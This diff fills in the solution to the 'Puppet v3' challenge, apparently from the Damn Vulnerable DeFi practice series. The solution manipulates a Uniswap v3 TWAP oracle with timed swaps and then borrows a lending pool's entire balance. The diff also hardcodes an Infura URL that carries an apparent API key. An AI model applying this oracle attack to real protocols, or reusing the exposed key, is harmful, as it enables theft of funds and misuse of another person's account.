@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://mainnet.infura.io/v3/b6bf7d3508c941499b10025c0776eaf8";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -37,6 +37,8 @@ describe('[Challenge] Puppet v3', function () {
     const DEPLOYER_INITIAL_ETH_BALANCE = 200n * 10n ** 18n;
 
     const LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;
+
+    const ONE = 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -140,6 +142,44 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        const attacker = await (await ethers.getContractFactory("AttackerPuppet3", deployer))
+            .deploy(lendingPool.address, uniswapPool.address, token.address, weth.address);
+
+
+        await weth.connect(player).deposit({value: 10n ** 17n});
+        await weth.connect(player).approve(attacker.address, 2n ** 256n - 1n);
+        await token.connect(player).approve(attacker.address, 2n ** 256n - 1n);
+        await weth.connect(player).approve(uniswapPositionManager.address, 2n ** 256n - 1n);
+        await token.connect(player).approve(uniswapPositionManager.address, 2n ** 256n - 1n);
+
+        // provide liquidity on full range
+        await uniswapPositionManager.connect(player).mint({
+            token0: weth.address,
+            token1: token.address,
+            tickLower: -887220,
+            tickUpper: 887220,
+            fee: 3000,
+            recipient: player.address,
+            amount0Desired: 1,
+            amount1Desired: 1,
+            amount0Min: 0,
+            amount1Min: 0,
+            deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
+        }, { gasLimit: 5000000 });
+
+        // make first swap
+        await attacker.connect(player).swapDVTWETH(PLAYER_INITIAL_TOKEN_BALANCE - 3n * (ONE / 2n)); // balance - 1.5 DVT
+
+        // wait for some seconds to reduce the TWAP
+        await ethers.provider.send("evm_increaseTime", [100]);
+
+        // make second swap to create a new observation
+        await attacker.connect(player).swapDVTWETH(ONE);
+
+        // borrow all lending pool tokens
+        await weth.connect(player).approve(lendingPool.address, 2n ** 256n - 1n);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
